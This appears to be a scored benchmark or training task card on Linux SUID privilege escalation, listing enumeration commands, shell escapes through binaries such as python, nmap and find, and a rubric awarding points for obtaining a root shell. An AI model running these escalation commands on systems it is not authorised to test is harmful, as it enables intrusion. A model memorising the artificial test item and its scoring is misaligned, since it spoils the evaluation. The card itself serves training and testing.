# FOX-PRIVESC-001: Linux SUID Abuse

## Info
| Field | Value |
|-------|-------|
| **ID** | FOX-PRIVESC-001 |
| **Domain** | Privilege Escalation |
| **MITRE** | T1548.001 (Abuse Elevation Control Mechanism: Setuid) |
| **Difficulty** | Easy |
| **Prerequisites** | Low-privilege shell on Linux |

## Methodology
1. **Enumeration**:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   find / -perm -6000 -type f 2>/dev/null  # SGID too
   ```
2. **GTFOBins check**: For each found SUID binary, search `https://gtfobins.github.io`
3. **Common privesc SUID binaries**:
   - `sudo` — `sudo -u root <cmd>` if sudoers allows
   - `pkexec` — check for CVE-2021-4034 (PwnKit)
   - `su` — classic
   - `passwd`, `mount`, `umount` — limited but check gtfobins
   - `python`, `perl`, `ruby` — if SUID, immediate root shell
   - `nmap` — interactive mode → `!sh`
   - `find` — `find . -exec /bin/sh \; -quit`
   - `vim` — `:!sh`
   - `less`/`more` — `!sh` from within pager
4. **Exploitation**:
   ```bash
   # python SUID
   /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
   
   # nmap interactive
   nmap --interactive
   !sh
   
   # find exec
   find . -exec /bin/sh \; -quit
   ```
5. **Verify**: `whoami` → root

## Keywords
`linux-privilege-escalation`, `SUID`, `GTFOBins`, `setuid privilege escalation`, `find -perm -4000`, `sudo -l`

## Scoring Criteria (0-100)
| Criteria | Points |
|----------|--------|
| SUID enumeration (full list) | 20 |
| GTFOBins reference checked | 20 |
| At least 1 SUID exploited | 30 |
| Root shell obtained | 30 |
| **Total** | **100** |
